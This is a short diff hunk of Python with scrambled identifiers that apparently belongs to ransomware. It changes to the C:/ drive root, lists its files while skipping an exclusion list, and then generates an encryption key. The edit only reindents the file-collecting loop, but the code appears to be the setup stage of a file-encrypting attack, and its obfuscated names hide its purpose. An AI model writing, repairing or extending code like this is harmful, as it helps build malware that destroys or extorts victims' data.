@@ -35,10 +35,10 @@ tfaTuWZiZVUI = "a98def102bbc7a81320c"
 JskLAkjSDiiW.chdir("C:/")
 
 for nMEZzQQWuIOFEA in JskLAkjSDiiW.listdir():
-        if nMEZzQQWuIOFEA in zWZiFIoQWIPfIPSF:
-            continue
-        if JskLAkjSDiiW.path.isfile(nMEZzQQWuIOFEA):
-            nnmANnmWDBbjQWFBJKf.append(nMEZzQQWuIOFEA)
+    if nMEZzQQWuIOFEA in zWZiFIoQWIPfIPSF:
+        continue
+    if JskLAkjSDiiW.path.isfile(nMEZzQQWuIOFEA):
+        nnmANnmWDBbjQWFBJKf.append(nMEZzQQWuIOFEA)
 
 aAWklWQHjkVE = NMENmEFNMWHjKXCHUoq.generate_key()
 
